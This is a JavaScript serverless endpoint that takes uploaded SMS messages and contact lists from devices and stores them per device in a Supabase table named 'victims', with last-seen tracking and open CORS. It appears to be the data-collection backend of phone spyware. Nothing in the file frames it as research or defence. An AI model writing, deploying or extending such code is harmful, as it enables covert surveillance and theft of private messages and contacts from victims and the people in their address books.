
import { supabase } from './_lib/supabase.js';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
    
    const { device_id, type, data } = req.body;
    
    let updateData = {};
    if (type === 'sms') updateData = { sms: JSON.stringify(data) };
    if (type === 'contacts') updateData = { contacts: JSON.stringify(data) };
    
    const { error } = await supabase
        .from('victims')
        .update({ ...updateData, last_seen: new Date().toISOString() })
        .eq('device_id', device_id);
    
    if (error) return res.status(500).json({ error: error.message });
    res.json({ status: 'ok' });
}
